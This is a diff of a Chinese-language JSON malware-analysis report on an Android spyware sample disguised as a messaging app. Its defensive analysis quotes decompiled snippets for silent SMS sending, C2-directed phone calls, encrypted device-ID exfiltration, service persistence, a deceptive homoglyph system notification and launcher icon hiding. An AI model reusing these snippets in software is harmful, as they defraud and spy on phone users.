@@ -6,7 +6,7 @@
     "应用名": "Сообщeниe",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 174.6
+    "分析耗时(秒)": 385.1
   },
   "行为列表": [
     {
@@ -30,7 +30,7 @@
           "risk_level": "中",
           "malicious_code_snippet": "public int onStartCommand(Intent intent, int i, int i2) {\n    a();\n    return 1;\n}",
           "malicious_code_snippet_context": "      }\n  \n      @Override // android.app.Service\n>>>     public int onStartCommand(Intent intent, int i, int i2) {\n>>>         a();\n>>>         return 1;\n>>>     }\n  }",
-          "behavior_description": "Service的onStartCommand方法被调用时执行混淆方法a()（疑似发起或维持C2通信），并返回START_STICKY(1)确保服务被系统杀死后自动重启，实现持久化保活。onDestroy中取消定时器(433)后调用stopSelf()，形成服务生命周期管理，保障C2连接的持续性。该方法名a()为单字母混淆，隐藏了实际通信逻辑。",
+          "behavior_description": "该代码位于混淆包名 com.beach.duke 下的 Service 类中（与厂商报告所述伪装成'消息'应用、利用AccessibilityService隐藏自身并监控用户的间谍样本特征吻合）。onStartCommand 在服务每次启动/重启时调用 a() 方法（推测为初始化或恢复恶意监控/C2通信连接的核心逻辑），并返回 START_STICKY(1)，使服务被系统杀死后自动重建，实现恶意进程持久化保活；配合 onDestroy 中取消通知(ID 433)与 stopSelf()，构成恶意样本的服务保活与触发入口。数据流向：系统 Service 启动回调→ a() 触发未知恶意逻辑（疑似建立/恢复C2连接或监控循环）→ START_STICKY 持久化保活，为后台远程控制与间谍行为提供持续运行环境。",
           "glm_analyzed": true
         }
       ]
@@ -63,9 +63,9 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
-          "malicious_code_snippet_context": "          System.out.println(\"\".trim());\n          try {\n              Meaning.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n          }\n      }",
-          "behavior_description": "代码通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，目标号码和短信内容来源于方法参数 str 和 str2，可能导致用户扣费或隐私泄露。",
+          "malicious_code_snippet": "public static void a(String str, String str2, PendingIntent pendingIntent) {\n    try {\n        SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n    } catch (Exception e) {\n    }\n}",
+          "malicious_code_snippet_context": "          context.startService(intent);\n      }\n  \n>>>     public static void a(String str, String str2, PendingIntent pendingIntent) {\n>>>         System.out.println(\"\".trim());\n>>>         try {\n>>>             Meaning.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n>>>         } catch (Exception e) {\n          }\n      }\n  ",
+          "behavior_description": "该方法封装了静默发送短信的功能：接收目标号码(str)、短信内容(str2)和发送状态回调 作为参数，直接调用 SmsManager.sendTextMessage() 在无任何用户界面、无用户确认的情况下发送短信。异常被空 catch 静默吞掉以隐藏发送失败痕迹。同类中还包含 a(Context) 方法检查 SDK<19 或自身是否为默认短信应用，用于规避 Android 4.4+ 的短信写入限制。数据流向：外部传入的目标号码和短信内容（通常来自C2服务器指令或硬编码配置）→ SmsManager.sendTextMessage() 静默发送。结合厂商报告确认该样本伪装成'信息'应用并通过 AccessibilityService 实施恶意行为，此静默发短信能力典型用于短信欺诈（向增值服务号码发送订阅短信扣费，或向攻击者指定号码外传数据），直接造成用户话费损失。",
           "glm_analyzed": true
         }
       ]
@@ -94,7 +94,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "jSONObject.put(\"id\", Settings.Secure.getString(this.b.getContentResolver(), \"android_id\"));\njSONObject.put(\"data\", this.c);\njSONObject.put(\"type\", this.a);\nb.a(this.b, this.a, Base64.encodeToString(new c().a(jSONObject.toString().getBytes()), 0));",
           "malicious_code_snippet_context": "      public void a() {\n          JSONObject jSONObject = new JSONObject();\n          try {\n>>>             jSONObject.put(\"id\", Settings.Secure.getString(this.b.getContentResolver(), \"android_id\"));\n>>>             jSONObject.put(\"data\", this.c);\n>>>             jSONObject.put(\"type\", this.a);\n>>>             b.a(this.b, this.a, Base64.encodeToString(new c().a(jSONObject.toString().getBytes()), 0));\n          } catch (Exception e) {\n          }\n      }",
-          "behavior_description": "代码获取设备的 android_id 作为设备指纹，连同收集的其他数据封装成 JSON 对象，经过自定义加密和 Base64 编码后发送到远程服务器，造成用户隐私泄露。",
+          "behavior_description": "该代码通过 Settings.Secure.getString 读取设备唯一标识 ANDROID_ID 作为设备指纹（id 字段），将其与此前收集的数据（this.c）及类型标识（this.a）打包为 JSON 对象，随后使用加密类 c 对 JSON 进行加密并 Base64 编码，最后通过 b.a() 将加密数据隐蔽外传至远程服务器。结合厂商报告确认该样本为伪装成'信息'应用、滥用 AccessibilityService 的间谍软件，此方法是窃取数据经加密混淆后回传 C2 的数据外泄通道，加密+Base64 处理明显是为了规避流量检测，属于设备指纹采集与隐私窃取行为。",
           "glm_analyzed": true
         }
       ]
@@ -123,11 +123,11 @@
           "class_path": "Lcom\\beach\\duke\\Artist;",
           "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
           "malicious_behavior": "persistence",
-          "behavior_type": "grayware",
+          "behavior_type": "malicious",
           "risk_level": "中",
-          "malicious_code_snippet": "((NotificationManager) getSystemService(\"notification\")).createNotificationChannel(new NotificationChannel(\"com.beach.duke.EMBOX\", \"Morsel\", 1));\nbuilder = new Notification.Builder(getApplicationContext(), \"com.beach.duke.EMBOX\");\nbuilder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(\"Oснoвнoй прoцесс\").setContentText(\"Cистемa не кoррeктно рабoтает...\");\nstartForeground(433, builder.build());\ngetPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), Carve.class), 2, 1);",
-          "malicious_code_snippet_context": "      private void a() {\n          Notification.Builder builder;\n          if (Build.VERSION.SDK_INT >= 26) {\n>>>             ((NotificationManager) getSystemService(\"notification\")).createNotificationChannel(new NotificationChannel(\"com.beach.duke.EMBOX\", \"Morsel\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"com.beach.duke.EMBOX\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n          builder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(\"Oснoвнoй прoцесс\").setContentText(\"Cистемa не кoррeктно рабoтает, вам нeобходимо включить дocтуп к стaтистикe для 'Oснoвнoй прoцесс'\").setWhen(System.currentTimeMillis());\n          startForeground(433, builder.build());\n          getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Carve.class), 2, 1);",
-          "behavior_description": "该代码创建前台服务以实现进程保活，通过创建通知渠道并构建伪装为系统错误提示的通知（使用俄语伪装成'系统工作不正确，需启用统计访问'的系统通知），调用startForeground使服务获得高优先级保活，同时通过setComponentEnabledSetting禁用Carve组件以隐蔽自身。通知内容具有社会工程学欺骗性，诱导用户误以为是系统提示。getApplicationContext()→startForeground()实现持久化保活，getPackageManager()→setComponentEnabledSetting()实现组件隐藏。",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    ((NotificationManager) getSystemService(\"notification\")).createNotificationChannel(new NotificationChannel(\"com.beach.duke.EMBOX\", \"Morsel\", 1));\n    builder = new Notification.Builder(getApplicationContext(), \"com.beach.duke.EMBOX\");\n} else {\n    builder = new Notification.Builder(getApplicationContext());\n}\nbuilder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Oснoвнoй прoцесс\").setContentText(\"Cистемa не кoррeктно рабoтает, вам нeобходимо включить дocтуп к стaтистикe для 'Oснoвнoй прoцесс'\");\nstartForeground(433, builder.build());\ngetPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), Carve.class), 2, 1);",
+          "malicious_code_snippet_context": "  \n      private void a() {\n          Notification.Builder builder;\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             ((NotificationManager) getSystemService(\"notification\")).createNotificationChannel(new NotificationChannel(\"com.beach.duke.EMBOX\", \"Morsel\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"com.beach.duke.EMBOX\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n>>>         builder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Oснoвнoй прoцесс\").setContentText(\"Cистемa не кoррeктно рабoтает, вам нeобходимо включить дocтуп к стaтистикe для 'Oснoвнoй прoцесс'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(433, builder.build());\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Carve.class), 2, 1);\n      }\n  \n      @Override // android.app.Service",
+          "behavior_description": "该代码位于恶意样本的 Service 组件中，通过 startForeground(433, ...) 将自身提升为前台服务实现进程保活，规避系统后台回收机制。通知标题伪装为俄语'Основной процесс'（主进程，且混用拉丁/西里尔同形字符进行混淆），通知内容欺骗用户'系统运行异常，需为主进程开启统计访问权限'，诱导用户授予无障碍等敏感权限（与厂商报告中利用 AccessibilityService 的行为吻合）；随后调用 setComponentEnabledSetting(..., 2, 1) 将 Carve 组件设为禁用状态（COMPONENT_ENABLED_STATE_DISABLED），隐藏应用图标使用户难以察觉和卸载。数据流向：Build.VERSION.SDK_INT（系统版本检测）→ startForeground() 前台服务保活 + setComponentEnabledSetting() 隐藏组件，为该间谍恶意软件的持久化驻留提供支撑。",
           "glm_analyzed": true
         }
       ]
@@ -162,7 +162,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
           "malicious_code_snippet_context": "      private static int b(Context context, String str) {\n          try {\n              Meaning.a(true);\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\n>>>             intent.addFlags(268435456);\n>>>             context.startActivity(intent);\n              return 0;\n          } catch (Exception e) {\n              return 6;",
-          "behavior_description": "代码使用 ACTION_CALL Intent 直接发起电话呼叫，无需用户在拨号界面二次确认。结合上下文中的 JSON 解析和 command 字段，传入的电话号码 str 极有可能来自远程 C2 服务器下发的指令，属于典型的静默拨打高额扣费号码的恶意行为。",
+          "behavior_description": "该方法位于IntentService中，接收一个电话号码字符串参数str（结合上文JSON指令解析逻辑，该号码来源于远程C2服务器下发的命令），随后构造android.intent.action.CALL的Intent并直接调用startActivity()发起通话。注意此处使用的是ACTION_CALL而非ACTION_DIAL：ACTION_DIAL仅调起拨号界面等待用户确认，而ACTION_CALL会绕过用户交互直接拨打电话（需CALL_PHONE权限），属于静默拨号操作。数据流向为：远程C2服务器JSON指令→解析出电话号码str→Intent ACTION_CALL→startActivity()静默拨打。攻击者可远程控制受害设备拨打高额付费号码或特定号码，直接造成用户话费损失，且该样本已被厂商确认利用AccessibilityService实施恶意行为的木马程序。",
           "glm_analyzed": true
         }
       ]
@@ -185,10 +185,10 @@
           "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
           "malicious_behavior": "icon_hiding",
           "behavior_type": "malicious",
-          "risk_level": "中",
+          "risk_level": "高",
           "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Carve.class), 2, 1);",
-          "malicious_code_snippet_context": "          }\n          builder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(\"Oснoвнoй прoцесс\").setContentText(\"Cистемa не кoррeктно рабoтает, вам нeобходимо включить дocтуп к стaтистикe для 'Oснoвнoй прoцесс'\").setWhen(System.currentTimeMillis());\n          startForeground(433, builder.build());\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Carve.class), 2, 1);\n      }\n  \n      @Override // android.app.Service",
-          "behavior_description": "代码通过 startForeground 启动前台服务以保活，随后调用 PackageManager.setComponentEnabledSetting() 将组件 Carve.class（通常为主 Activity/Launcher Activity）设置为 DISABLED 状态（参数2），导致应用图标从启动器中隐藏。这是恶意软件常用的图标隐藏手法，使用户难以发现和卸载恶意应用，同时配合伪装的系统错误通知（俄语）诱导用户操作。",
+          "malicious_code_snippet_context": "          }\n          builder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Oснoвнoй прoцесс\").setContentText(\"Cистемa не кoррeктно рабoтает, вам нeобходимо включить дocтуп к стaтистикe для 'Oснoвнoй прoцесс'\").setWhen(System.currentTimeMillis());\n          startForeground(433, builder.build());\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Carve.class), 2, 1);\n      }\n  \n      @Override // android.app.Service",
+          "behavior_description": "该代码位于后台 Service 中，先通过 createNotificationChannel/startForeground 创建前台服务通知，通知内容为使用同形异义字符（西里尔字母混排）伪装的俄语系统提示'系统运行不正常，需要为主进程启用统计信息访问权限'，诱导用户开启无障碍服务；随后调用 setComponentEnabledSetting 将应用入口组件 Carve（启动器 Activity）设置为 COMPONENT_ENABLED_STATE_DISABLED(2)，使应用图标从桌面启动器中消失，用户无法再通过图标定位或卸载该应用，实现自我隐藏以长期驻留监控用户，与厂商报告中'hides itself in order to spy on its victims'的行为一致。数据流向：getApplicationContext()/getPackageManager() 获取包管理器 → setComponentEnabledSetting() 静默禁用入口组件实现图标隐藏。",
           "glm_analyzed": true
         }
       ]
@@ -201,7 +201,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
